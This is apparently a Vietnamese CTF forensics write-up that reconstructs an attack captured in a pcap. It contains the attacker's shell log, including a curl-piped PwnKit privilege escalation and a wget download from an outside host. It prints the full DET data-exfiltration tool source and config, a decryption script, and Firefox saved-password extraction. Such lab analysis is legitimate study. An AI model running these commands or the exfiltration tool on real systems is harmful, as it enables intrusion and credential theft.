# Mô tả

[NetLab8: Super Secure Traffic](https://ctf.viblo.asia/puzzles/netlab8-super-secure-traffic-z7wtkfohhjs)

The attack is very quick and stealthy, can you find out what happened?

**Bài cho ta một file pcap**

# Tham khảo

https://medium.com/@jsaxena017/web-browser-forensics-part-2-firefox-browser-3dc6ef104607

https://github.com/unode/firefox_decrypt

# Phân tích

## Stage 1: Data exfiltration

Mở file pcap ra và kiểm tra TCP stream ta thấy có các dòng lệnh được thực hiện

```bash
# 
id

uid=0(root) gid=0(root) groups=0(root)
# 
uname -r

5.4.0-72-generic
# 
lsb_release -a

No LSB modules are available.
Distributor ID:	Ubuntu
Description:	Ubuntu 20.04.2 LTS
Release:	20.04
Codename:	focal
# 
pwd

/home/remnux/Desktop
# 
eval "$(curl -s https://raw.githubusercontent.com/berdav/CVE-2021-4034/main/cve-2021-4034.sh)"

cc -Wall --shared -fPIC -o pwnkit.so pwnkit.c
cc -Wall    cve-2021-4034.c   -o cve-2021-4034
echo "module UTF-8// PWNKIT// pwnkit 1" > gconv-modules
mkdir -p GCONV_PATH=.
cp -f /usr/bin/true GCONV_PATH=./pwnkit.so:.

whoami

root

rm -rf *
wget  10.2.32.72:7777/DET.zip

--2022-11-15 04:12:01--  http://10.2.32.72:7777/DET.zip
Connecting to 10.2.32.72:7777... connected.
HTTP request sent, awaiting response... 200 OK
Length: 8142 (8.0K) [application/zip]
Saving to: 'DET.zip'

     0K .......                                               100%  623M=0s

2022-11-15 04:12:01 (623 MB/s) - 'DET.zip' saved [8142/8142]


unzip DET.zip

Archive:  DET.zip
  inflating: config.json             
  inflating: det.py                  
   creating: plugins/
  inflating: plugins/http.py         
  inflating: plugins/http.pyc        
  inflating: plugins/icmp.py         
  inflating: plugins/icmp.pyc        

ls

DET.zip
config.json
det.py
plugins

cd /home
ls

evil-hacker
remnux

cd remnux
ls -la

total 96
drwxr-xr-x 17 remnux remnux 4096 Nov 14 21:41 .
drwxr-xr-x  4 root   root   4096 Nov 15 01:56 ..
-rw-------  1 remnux remnux    8 Apr 20  2021 .bash_history
-rw-r--r--  1 remnux remnux  220 Apr 20  2021 .bash_logout
-rw-r--r--  1 remnux remnux 3906 Apr 20  2021 .bashrc
drwx------ 13 remnux remnux 4096 Nov 15 04:00 .cache
drwxr-xr-x 11 remnux remnux 4096 Nov 14 22:28 .config
-rw-r--r--  1 remnux remnux 1267 Apr 20  2021 .curlrc
drwxr-xr-x  2 remnux remnux 4096 Apr 20  2021 .dbus
drwxr-xr-x  4 remnux remnux 4096 Apr 20  2021 .ghidra
drwx------  3 remnux remnux 4096 Apr 20  2021 .gnupg
drwxr-xr-x  5 remnux remnux 4096 Nov 14 21:26 .local
-rw-r--r--  1 remnux remnux  212 Apr 20  2021 .malwapi.conf
drwx------  5 remnux remnux 4096 Nov 14 21:41 .mozilla
-rw-r--r--  1 remnux remnux  807 Apr 20  2021 .profile
-rw-r--r--  1 remnux remnux    0 Apr 20  2021 .sudo_as_admin_successful
-rw-r--r--  1 remnux remnux 1345 Apr 20  2021 .wgetrc
drwxr-xr-x  3 remnux remnux 4096 Nov 15 04:12 Desktop
drwxr-xr-x  2 remnux remnux 4096 Apr 20  2021 Documents
drwxr-xr-x  2 remnux remnux 4096 Apr 20  2021 Downloads
drwxr-xr-x  2 remnux remnux 4096 Apr 20  2021 Music
drwxr-xr-x  2 remnux remnux 4096 Apr 20  2021 Pictures
drwxr-xr-x  2 remnux remnux 4096 Apr 20  2021 Public
drwxr-xr-x  2 remnux remnux 4096 Apr 20  2021 Templates
drwxr-xr-x  2 remnux remnux 4096 Apr 20  2021 Videos

cd .mozilla/firefox/
ls

7ltvf97n.default-release
Crash Reports
Pending Pings
installs.ini
ltrbemh4.default
profiles.ini

7z a profile.zip ./7ltvf97n.default-release


7-Zip [64] 16.02 : Copyright (c) 1999-2016 Igor Pavlov : 2016-05-21
p7zip Version 16.02 (locale=C,Utf16=off,HugeFiles=on,64 bits,2 CPUs Intel(R) Core(TM) i3-10100 CPU @ 3.60GHz (A0653),ASM,AES-NI)

Scanning the drive:
34 folders, 69 files, 27207961 bytes (26 MiB)

Creating archive: profile.zip

Items to compress: 103


Files read from disk: 69
Archive size: 5070622 bytes (4952 KiB)
Everything is Ok

cd /home/remnux/Desktop
python2 det.py -c ./config.json -p icmp,http -f /home/remnux/.mozilla/firefox/profile.zip >/dev/null 2>&1
ls

DET.zip
config.json
det.py
plugins

rm *

rm: cannot remove 'plugins': Is a directory

rm -rf *
exit

# 
```

Nói chung là hacker đã xâm nhập vào máy người dùng sau đó tải file `DET.zip` từ `10.2.32.72:7777/DET.zip`. Tiếp theo hacker di chuyển đến thư mục của firefox trong máy `cd .mozilla/firefox/` và nén lại thư mục profile của người dùng `7z a profile.zip ./7ltvf97n.default-release` rồi sử dụng chương trình **det.py** tải về từ trước để gửi dữ liệu file zip qua **icmp, http** và gửi output đến `/dev/null` để người dùng không thấy được trên máy

Vậy muốn khôi phục lại thư mục profile và tìm ra flag ta phải biết được cách mà **det.py** hoạt động, vì hacker đã dùng `wget` để tải file `DET.zip` nên ta vẫn có thể tải lại file đó qua pcap trong phần `Export Objects/HTTP` 

Đây là nội dung file **det.py**

```py
import os
import random
import threading
import hashlib
import argparse
import sys
import string
import time
import json
import signal
import struct
import tempfile
from random import randint
from os import listdir
from os.path import isfile, join
from Crypto.Cipher import AES
from zlib import compress, decompress

KEY = ""
MIN_TIME_SLEEP = 1
MAX_TIME_SLEEP = 30
MIN_BYTES_READ = 1
MAX_BYTES_READ = 500
COMPRESSION    = True
files = {}
threads = []
config = None


class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'


def display_message(message):
    print "[%s] %s" % (time.strftime("%Y-%m-%d.%H:%M:%S", time.gmtime()), message)


def warning(message):
    display_message("%s%s%s" % (bcolors.WARNING, message, bcolors.ENDC))


def ok(message):
    display_message("%s%s%s" % (bcolors.OKGREEN, message, bcolors.ENDC))


def info(message):
    display_message("%s%s%s" % (bcolors.OKBLUE, message, bcolors.ENDC))


def aes_encrypt(message, key=KEY):
    try:
        # Generate random CBC IV
        iv = os.urandom(AES.block_size)

        # Derive AES key from passphrase
        aes = AES.new(hashlib.sha256(key).digest(), AES.MODE_CBC, iv)

        # Add PKCS5 padding
        pad = lambda s: s + (AES.block_size - len(s) % AES.block_size) * chr(AES.block_size - len(s) % AES.block_size)

        # Return data size, iv and encrypted message
        return iv + aes.encrypt(pad(message))
    except:
        return None

def md5(fname):
    hash = hashlib.md5()
    with open(fname) as f:
        for chunk in iter(lambda: f.read(4096), ""):
            hash.update(chunk)
    return hash.hexdigest()


function_mapping = {
    'display_message': display_message,
    'warning': warning,
    'ok': ok,
    'info': info,
    'aes_encrypt' : aes_encrypt,
}


class Exfiltration(object):

    def __init__(self, results, KEY):
        self.KEY = KEY
        self.plugin_manager = None
        self.plugins = {}
        self.results = results
        self.target = "127.0.0.1"

        path = "plugins/"
        plugins = {}

        # Load plugins
        sys.path.insert(0, path)
        for f in os.listdir(path):
            fname, ext = os.path.splitext(f)
            if ext == '.py' and self.should_use_plugin(fname):
                mod = __import__(fname)
                plugins[fname] = mod.Plugin(self, config["plugins"][fname])

    def should_use_plugin(self, plugin_name):
        # if the plugin has been specified specifically (-p twitter)
        if self.results.plugin and plugin_name not in self.results.plugin.split(','):
            return False
        # if the plugin is not in the exclude param
        elif self.results.exclude and plugin_name in self.results.exclude.split(','):
            return False
        else:
            return True

    def register_plugin(self, transport_method, functions):
        self.plugins[transport_method] = functions

    def get_plugins(self):
        return self.plugins

    def aes_encrypt(self, message):
        return aes_encrypt(message, self.KEY)


    def log_message(self, mode, message):
        if mode in function_mapping:
            function_mapping[mode](message)

    def get_random_plugin(self):
        plugin_name = random.sample(self.plugins, 1)[0]
        return plugin_name, self.plugins[plugin_name]['send']

    def use_plugin(self, plugins):
        tmp = {}
        for plugin_name in plugins.split(','):
            if (plugin_name in self.plugins):
                tmp[plugin_name] = self.plugins[plugin_name]
        self.plugins.clear()
        self.plugins = tmp

    def remove_plugins(self, plugins):
        for plugin_name in plugins:
            if plugin_name in self.plugins:
                del self.plugins[plugin_name]
        display_message("{0} plugins will be used".format(
            len(self.get_plugins())))

    def register_file(self, message):
        global files
        jobid = message[0]
        if jobid not in files:
            files[jobid] = {}
            files[jobid]['checksum'] = message[3].lower()
            files[jobid]['filename'] = message[1].lower()
            files[jobid]['data'] = []
            files[jobid]['packets_number'] = []
            warning("Register packet for file %s with checksum %s" %
                    (files[jobid]['filename'], files[jobid]['checksum']))

    def retrieve_file(self, jobid):
        global files
        fname = files[jobid]['filename']
        filename = "%s.%s" % (fname.replace(
            os.path.pathsep, ''), time.strftime("%Y-%m-%d.%H:%M:%S", time.gmtime()))
        content = ''.join(str(v) for v in files[jobid]['data']).decode('hex')
        if COMPRESSION:
            content = decompress(content)
        f = open(filename, 'w')
        f.write(content)
        f.close()
        if (files[jobid]['checksum'] == md5(filename)):
            ok("File %s recovered" % (fname))
        else:
            warning("File %s corrupt!" % (fname))
        del files[jobid]

    def retrieve_data(self, data):
        global files
        try:
            message = data
            if (message.count("|!|") >= 2):
                info("Received {0} bytes".format(len(message)))
                message = message.split("|!|")
                jobid = message[0]

                # register packet
                if (message[2] == "REGISTER"):
                    self.register_file(message)
                # done packet
                elif (message[2] == "DONE"):
                    self.retrieve_file(jobid)
                # data packet
                else:
                    # making sure there's a jobid for this file
                    if (jobid in files and message[1] not in files[jobid]['packets_number']):
                        files[jobid]['data'].append(''.join(message[2:]))
                        files[jobid]['packets_number'].append(message[1])
        except:
            raise
            pass


class ExfiltrateFile(threading.Thread):

    def __init__(self, exfiltrate, file_to_send):
        threading.Thread.__init__(self)
        self.file_to_send = file_to_send
        self.exfiltrate = exfiltrate
        self.jobid = ''.join(random.sample(
            string.ascii_letters + string.digits, 7))
        self.checksum = md5(file_to_send)
        self.daemon = True

    def run(self):
        # registering packet
        plugin_name, plugin_send_function = self.exfiltrate.get_random_plugin()
        ok("Using {0} as transport method".format(plugin_name))

        warning("[!] Registering packet for the file")
        data = "%s|!|%s|!|REGISTER|!|%s" % (
            self.jobid, os.path.basename(self.file_to_send), self.checksum)
        plugin_send_function(data)


        # sending the data
        f = tempfile.SpooledTemporaryFile()
        e = open(self.file_to_send, 'rb')
        data = e.read()
        if COMPRESSION:
            data = compress(data)
        f.write(aes_encrypt(data, self.exfiltrate.KEY))
        f.seek(0)
        e.close()

        packet_index = 0
        while (True):
            data_file = f.read(randint(MIN_BYTES_READ, MAX_BYTES_READ)).encode('hex')
            if not data_file:
                break
            plugin_name, plugin_send_function = self.exfiltrate.get_random_plugin()
            ok("Using {0} as transport method".format(plugin_name))
            # info("Sending %s bytes packet" % len(data_file))

            data = "%s|!|%s|!|%s" % (self.jobid, packet_index, data_file)
            plugin_send_function(data)
            packet_index = packet_index + 1


        # last packet
        plugin_name, plugin_send_function = self.exfiltrate.get_random_plugin()
        ok("Using {0} as transport method".format(plugin_name))
        data = "%s|!|%s|!|DONE" % (self.jobid, packet_index)
        plugin_send_function(data)
        f.close()
        sys.exit(0)


def signal_handler(bla, frame):
    global threads
    warning('Killing DET and its subprocesses')
    os.kill(os.getpid(), signal.SIGKILL)


def main():
    global MAX_TIME_SLEEP, MIN_TIME_SLEEP, KEY, MAX_BYTES_READ, MIN_BYTES_READ, COMPRESSION
    global threads, config

    parser = argparse.ArgumentParser(
        description='Data Exfiltration Toolkit (SensePost)')
    parser.add_argument('-c', action="store", dest="config", default=None,
                        help="Configuration file (eg. '-c ./config-sample.json')")
    parser.add_argument('-f', action="store", dest="file",
                        help="File to exfiltrate (eg. '-f /etc/passwd')")
    parser.add_argument('-d', action="store", dest="folder",
                        help="Folder to exfiltrate (eg. '-d /etc/')")
    parser.add_argument('-p', action="store", dest="plugin",
                        default=None, help="Plugins to use (eg. '-p dns,twitter')")
    parser.add_argument('-e', action="store", dest="exclude",
                        default=None, help="Plugins to exclude (eg. '-e gmail,icmp')")
    parser.add_argument('-L', action="store_true",
                        dest="listen", default=False, help="Server mode")
    results = parser.parse_args()

    if (results.config is None):
        print "Specify a configuration file!"
        parser.print_help()
        sys.exit(-1)

    with open(results.config) as data_file:
        config = json.load(data_file)

    signal.signal(signal.SIGINT, signal_handler)
    ok("CTRL+C to kill DET")

    MIN_TIME_SLEEP = int(config['min_time_sleep'])
    MAX_TIME_SLEEP = int(config['max_time_sleep'])
    MIN_BYTES_READ = int(config['min_bytes_read'])
    MAX_BYTES_READ = int(config['max_bytes_read'])
    COMPRESSION    = bool(config['compression'])
    KEY = config['AES_KEY']
    app = Exfiltration(results, KEY)


    if (results.listen):
        threads = []
        plugins = app.get_plugins()
        for plugin in plugins:
            thread = threading.Thread(target=plugins[plugin]['listen'])
            thread.daemon = True
            thread.start()
            threads.append(thread)

    else:
        if (results.folder is None and results.file is None):
            warning("[!] Specify a file or a folder!")
            parser.print_help()
            sys.exit(-1)
        if (results.folder):
            files = ["{0}{1}".format(results.folder, f) for
                     f in listdir(results.folder)
                     if isfile(join(results.folder, f))]
        else:
            files = [results.file]

        threads = []
        for file_to_send in files:
            info("Launching thread for file {0}".format(file_to_send))
            thread = ExfiltrateFile(app, file_to_send)
            threads.append(thread)
            thread.daemon = True
            thread.start()

    for thread in threads:
        while True:
            thread.join(1)
            if not thread.isAlive():
                break

if __name__ == '__main__':
    main()
```

Trong code đã có các phần comment khá rõ ràng rồi, ta để ý 2 phần

```py
    def run(self):
        # registering packet
        plugin_name, plugin_send_function = self.exfiltrate.get_random_plugin()
        ok("Using {0} as transport method".format(plugin_name))

        warning("[!] Registering packet for the file")
        data = "%s|!|%s|!|REGISTER|!|%s" % (
            self.jobid, os.path.basename(self.file_to_send), self.checksum)
        plugin_send_function(data)


        # sending the data
        f = tempfile.SpooledTemporaryFile()
        e = open(self.file_to_send, 'rb')
        data = e.read()
        if COMPRESSION:
            data = compress(data)
        f.write(aes_encrypt(data, self.exfiltrate.KEY))
        f.seek(0)
        e.close()

        packet_index = 0
        while (True):
            data_file = f.read(randint(MIN_BYTES_READ, MAX_BYTES_READ)).encode('hex')
            if not data_file:
                break
            plugin_name, plugin_send_function = self.exfiltrate.get_random_plugin()
            ok("Using {0} as transport method".format(plugin_name))
            # info("Sending %s bytes packet" % len(data_file))

            data = "%s|!|%s|!|%s" % (self.jobid, packet_index, data_file)
            plugin_send_function(data)
            packet_index = packet_index + 1


        # last packet
        plugin_name, plugin_send_function = self.exfiltrate.get_random_plugin()
        ok("Using {0} as transport method".format(plugin_name))
        data = "%s|!|%s|!|DONE" % (self.jobid, packet_index)
        plugin_send_function(data)
        f.close()
        sys.exit(0)
```

Đây là phần chạy chương trình, file sẽ được chia nhỏ thành nhiều phần, encode B64 và mã hoá (AES_CBC) rồi gửi đến server C2 với các dạng sau:

- Packet đầu `%s|!|%s|!|REGISTER|!|%s` sẽ là `jobid|!|filename|!|REGISTER|!|checksum`
- Các packet data `%s|!|%s|!|%s` sẽ là `jobid|!|index|!|encrypted_data`
- Packet cuối `%s|!|%s|!|DONE` sẽ là `jobid|!|index|!|DONE`
- Vậy khi khôi phục lại file ta có thể bỏ phần `REGISTER` đi cũng được, vì nó chỉ chứa checksum

**Một vài ví dụ các packet**

```markdown
### Packet đầu
gud9HOB|!|profile.zip|!|REGISTER|!|349b9e33228e50579d432ae9d13cef47
### Packet data
gud9HOB|!|0|!|5d3050f8aea75531714c17de9efef578bb5b4ca35b7015a5c8118ae14aa384d4c1a49f729935f032bf1fc48d440198ea8e255daf058f641f47eb33dc431bfe540200d5170eefb45829cf400c4329ca5139c661e9ff29f223a8c16ea70f94ac5d621360afecbe60042af7bf631c775493829dbfc41d33a510257162eda6c3d7d505664319b5e01471e41cad4cbfd5b8a23625dfd610a172b752d7c81424c94d5ff28619017c3926f16f7a05b5f3a594a4f636be756dd419d4e72ede1f73424dc0361a561a1b2c44c62a4387756e57417b863e1545855f49234fdf083bc8ce86c76273a054bf4ebb1258ed9e2fd893e4330829e8f3855513cc78f2e0897d2cfd52d46be665e464718f301b1722badaf2cc6210c117137beac54c9b4fe5eb628603bdb8d2ef237867880c4f50e59f9249712d890476b9703c0ce8d5bac351f81b54bfbf586f131baeb57b5bfd3aeae41e4a87c80e2de24d141c
### Packet cuối
gud9HOB|!|14349|!|DONE
```

Tiếp theo là các tuỳ chọn của **det.py**

```py
    parser = argparse.ArgumentParser(
        description='Data Exfiltration Toolkit (SensePost)')
    parser.add_argument('-c', action="store", dest="config", default=None,
                        help="Configuration file (eg. '-c ./config-sample.json')")
    parser.add_argument('-f', action="store", dest="file",
                        help="File to exfiltrate (eg. '-f /etc/passwd')")
    parser.add_argument('-d', action="store", dest="folder",
                        help="Folder to exfiltrate (eg. '-d /etc/')")
    parser.add_argument('-p', action="store", dest="plugin",
                        default=None, help="Plugins to use (eg. '-p dns,twitter')")
    parser.add_argument('-e', action="store", dest="exclude",
                        default=None, help="Plugins to exclude (eg. '-e gmail,icmp')")
    parser.add_argument('-L', action="store_true",
                        dest="listen", default=False, help="Server mode")
```

Trước đó, hacker đã chạy `python2 det.py -c ./config.json -p icmp,http -f /home/remnux/.mozilla/firefox/profile.zip >/dev/null 2>&1` sử dụng một file config `-c ./config.json`, `-p sử dụng plugin icmp và http`, `-f file truyền đi là profile.zip`

Trong **DET.py** cũng có những file này, 2 file plugin `http.py` và `icmp.py` không có gì đặc biệt lắm, chỉ là cách gửi hoặc nghe thôi

**config.json** sẽ là những tuỳ chọn mà chương trình sẽ sử dụng như là ip, port, key,...

```json 
{
    "plugins": {
        "http": {
            "target": "10.2.32.72",
            "port": 8080
        },
        "google_docs": {
            "target": "SERVER",
            "port": 8080
        },        
        "dns": {
            "key": "google.com",
            "target": "10.2.32.72",
            "port": 53
        },
        "gmail": {
            "username": "dataexfil@gmail.com",
            "password": "ATi8OI01j7aWzfuG",
            "server": "smtp.gmail.com",
            "port": 587
        },
        "tcp": {
            "target": "10.2.32.72",
            "port": 6969
        },
        "udp": {
            "target": "10.2.32.72",
            "port": 6969
        },
        "twitter": {
            "username": "V-i-b-l-o",
            "CONSUMER_TOKEN": "XXXXXXXXXXX",
            "CONSUMER_SECRET": "XXXXXXXXXXX",
            "ACCESS_TOKEN": "XXXXXXXXXXX",
            "ACCESS_TOKEN_SECRET": "XXXXXXXXXXX"
        },
        "icmp": {
            "target": "10.2.32.72"
        },
        "slack": {
            "api_token": "xoxb-XXXXXXXXXXX",
            "chan_id": "XXXXXXXXXXX",
            "bot_id": "<@XXXXXXXXXXX>:"
        }
    },
    "AES_KEY": "NY9/ATi8OI01j7aWzfuG",
    "max_time_sleep": 10,
    "min_time_sleep": 1,
    "max_bytes_read": 400,
    "min_bytes_read": 300,
    "compression": 1
}
```

Vậy là khi truyền qua `HTTP` sẽ truyền đến `10.2.32.72:8080` còn khi dùng `ICMP` thì truyền đến `10.2.32.72`

Ở đây cũng có key rồi: **NY9/ATi8OI01j7aWzfuG**. Nhưng mà chưa có iv, xem lại hàm `run()` trong `det.py`

```py
        e = open(self.file_to_send, 'rb')
        data = e.read()
        if COMPRESSION:
            data = compress(data)
        f.write(aes_encrypt(data, self.exfiltrate.KEY))
        f.seek(0)
        e.close()
```

Biết được chương trình sử dụng mã hoá `AES_CBC` cho nên iv sẽ có 16 byte mà `f.write(aes_encrypt(data, self.exfiltrate.KEY))` cho nên iv sẽ chính là 16 byte đầu của data

Bây giờ chỉ cần khôi phục lại thôi. Trong file pcap ta filter `ip.dst == 10.2.32.72 && (http && tcp.port != 7777 || icmp)`, `tcp.port != 7777` để không lấy packet tải file `DET.zip` rồi lưu lại vào `capture.pcap` sau đó ta xuất dữ liệu ra

```bash
tshark -r capture.pcap -T fields -e data.data -e urlencoded-form.value > data.txt
```

**Lưu ý:** Do dữ liệu xuất ra từ đây lẫn cả hex (data.data của icmp) và B64 (urlencoded-form.value của http) nên khi tạo script khôi phục tôi (chatgbt) đã phải xử lí cả 2 trường hợp trên

Đây là script khôi phục

```py
#!/usr/bin/env python3
import re, sys, json, zlib, base64, hashlib, string
from Crypto.Cipher import AES

DATA_TXT  = "data.txt"
CONFIG    = "config.json"

# Find key
with open(CONFIG, 'r') as f:
    cfg = json.load(f)
AES_KEY = cfg.get("AES_KEY")
if not AES_KEY:
    print("AES_KEY not found in config.js"); sys.exit(1)

chunks = {}
JOBID = None

# hex and b64 diff
hex_re = re.compile(r'^[0-9a-fA-F]+$')
b64_re = re.compile(r'^[A-Za-z0-9+/=]+$')

def normalize_line(line):
    """
    Custom decoding
    ICMP: hex str → bytes → Base64-decode → raw
   	HTTP: Base64 str → raw
    """
    icmp_hex, http_b64 = line.rstrip("\n").split("\t")
    if icmp_hex:
        # data.data (icmp)
        if not hex_re.match(icmp_hex):
            raise ValueError(f"ICMP chunk not hex: {icmp_hex[:30]}")
        b64bytes = bytes.fromhex(icmp_hex)
        raw = base64.b64decode(b64bytes)
        return raw

    if http_b64:
        # urlencoded-form.value (b64)
        if not b64_re.match(http_b64):
            raise ValueError(f"HTTP chunk not Base64: {http_b64[:30]}")
        raw = base64.b64decode(http_b64)
        return raw

    return None

def extract_fields(raw):
    parts = raw.split(b"|!|")
    # REGISTER (Ignored)
    if len(parts) == 4 and parts[2] == b"REGISTER":
        return None, None, None
    # DONE
    if len(parts) == 3 and parts[2] == b"DONE":
        jobid = parts[0].decode()
        idx   = int(parts[1])
        return jobid, idx, "DONE"
    # DATA
    if len(parts) == 3:
        jobid   = parts[0].decode()
        idx     = int(parts[1])
        hexchunk= parts[2].decode().strip()
        return jobid, idx, hexchunk

    return None, None, None

# Read file
with open(DATA_TXT, 'r') as f:
    for line in f:
        raw = normalize_line(line)
        if not raw:
            continue
        jobid, idx, chunk = extract_fields(raw)
        if not jobid:
            # REGISTER or unknown format
            continue
        JOBID = jobid
        if chunk == "DONE":
            break
        # Save chunks
        chunks[idx] = chunk

if not chunks:
    print("No chunks"); sys.exit(1)

# Check for missing idx
for idx in list(chunks):
    clean = ''.join(c for c in chunks[idx] if c in string.hexdigits)
    chunks[idx] = clean

max_idx = max(chunks)
missing = set(range(max_idx+1)) - set(chunks)
if missing:
    print(f"Missing indexes: {sorted(missing)}"); sys.exit(1)

# Recover ciphertext
hexdata = "".join(chunks[i] for i in range(max_idx+1))
total_bytes = len(hexdata)//2
if total_bytes % AES.block_size != 0:
    print(f"Ciphertext len: {total_bytes} byte, note divisible by {AES.block_size}"); sys.exit(1)

blob = bytes.fromhex(hexdata)
iv, ct = blob[:16], blob[16:]

# AES-CBC decrypt
key = hashlib.sha256(AES_KEY.encode()).digest()
aes = AES.new(key, AES.MODE_CBC, iv)
padded = aes.decrypt(ct)

# zlib decompress
try:
    data = zlib.decompress(padded)
    print("Decompressed")
except zlib.error:
    data = padded
    print("Decompress failed")

# Write file
outfn = f"{JOBID}-restored.zip"
with open(outfn, 'wb') as f:
    f.write(data)

print(f"Saved to {outfn}")
```

Chạy script `recover_firefox_profile.py` và ta sẽ khôi phục được thư mục profile gốc trên máy người dùng

## Stage 2: Firefox profile

Ta có thư mục profile của người dùng, một vài file đầu tiên nên kiểm tra trước có thể nhắc đến là `places.sqlite` để lưu lịch sử, bookmarks, tải file,... Khi kiểm tra ta biết được ngoài các trang mặc định trên firefox thì người dùng có truy cập vào trang web **Viblo CTF - Login** `https://accounts.viblo.asia/login?service=ctf`. Vậy có thể flag chính là tên hoặc là mật khẩu được nhập vào đây

Để kiểm tra các file liên quan tới thông tin đăng nhập ta sẽ xem thêm các file `formhistory.sqlite` thì biết được tên người dùng là `bquanman` và 2 file `key4.db`, `logins.json`

```json
{
  "nextId": 2,
  "logins": [
    {
      "id": 1,
      "hostname": "https://accounts.viblo.asia",
      "httpRealm": null,
      "formSubmitURL": "",
      "usernameField": "",
      "passwordField": "",
      "encryptedUsername": "MDoEEPgAAAAAAAAAAAAAAAAAAAEwFAYIKoZIhvcNAwcECDn1Hi6viGBkBBCVPb0qV6S10+AhB/lFysR6",
      "encryptedPassword": "MFIEEPgAAAAAAAAAAAAAAAAAAAEwFAYIKoZIhvcNAwcECIKA+mPnWCMmBCjJxTk3OSwHEdaGt70j6LbnHSRwlGsIheX6QxAtjaQocz9fX3x2KI8x",
      "guid": "{c008541b-a4de-42ad-877a-94e97155273b}",
      "encType": 1,
      "timeCreated": 1668481728547,
      "timeLastUsed": 1668481728547,
      "timePasswordChanged": 1668481728547,
      "timesUsed": 1
    }
  ],
  "potentiallyVulnerablePasswords": [],
  "dismissedBreachAlertsByLoginGUID": {},
  "version": 3
}
```

**login.json** sẽ chứa tên tài khoản và mật khẩu của người dùng đã bị mã hoá, và key để giải mã nó sẽ nằm trong **key4.db**. Sau khi tìm trên mạng một lúc thì có một vài tool để giải mã mật khẩu trong profile: https://github.com/unode/firefox_decrypt

Tải về và chạy `python .\firefox_decrypt.py "./7ltvf97n.default-release"` sẽ giải mã tên tài khoản và mật khẩu - cũng chính là flag

```
PS C:\Users\admin\Desktop\NetLab8\2nd-stage> python .\firefox_decrypt.py "./7ltvf97n.default-release"
2025-08-01 09:31:58,928 - WARNING - Running with unsupported encoding 'locale': cp1252 - Things are likely to fail from here onwards
2025-08-01 09:31:59,069 - WARNING - profile.ini not found in ./7ltvf97n.default-release
2025-08-01 09:31:59,069 - WARNING - Continuing and assuming './7ltvf97n.default-release' is a profile location

Website:   https://accounts.viblo.asia
Username: 'bquanman'
Password: 'Flag{NetLab8_I_kn0W_y0uR_P4s$w0rd}'
```

# Flag

`Flag{NetLab8_I_kn0W_y0uR_P4s$w0rd}`
